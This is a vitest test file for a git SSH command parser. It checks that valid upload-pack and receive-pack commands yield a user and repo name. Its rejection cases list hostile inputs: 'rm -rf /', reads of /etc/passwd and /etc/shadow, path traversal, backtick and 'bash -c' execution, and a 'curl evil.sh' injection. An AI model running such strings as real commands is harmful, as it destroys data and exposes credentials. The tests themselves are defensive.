import { describe, expect, it } from 'vitest';

import { parseGitCommand } from './git-command.js';

describe('parseGitCommand', () => {
  it('reads the fetch command git sends', () => {
    expect(parseGitCommand("git-upload-pack '/octocat/hello.git'")).toEqual({
      service: 'git-upload-pack',
      username: 'octocat',
      repo: 'hello',
    });
  });

  it('reads the push command, unquoted and without the .git suffix', () => {
    expect(parseGitCommand('git-receive-pack octocat/hello')).toEqual({
      service: 'git-receive-pack',
      username: 'octocat',
      repo: 'hello',
    });
  });

  it('keeps dots inside a name', () => {
    expect(
      parseGitCommand("git-upload-pack 'octocat/dot.files.git'")?.repo,
    ).toBe('dot.files');
  });

  it.each([
    'git-upload-pack /etc/passwd; rm -rf /',
    "git-upload-pack '/../../etc/shadow'",
    "git-upload-pack '/octocat/../secrets.git'",
    "git-upload-pack '/octocat/hello.git' && curl evil.sh",
    'git-upload-pack `whoami`/hello',
    "git-upload-pack '/octocat/hello.git;'",
    'scp -f /etc/passwd',
    'bash -c "id"',
    'git-upload-archive /octocat/hello.git',
    "git-upload-pack '/octocat/a/b.git'",
    '',
  ])('refuses %j', (command) => {
    expect(parseGitCommand(command)).toBeNull();
  });
});
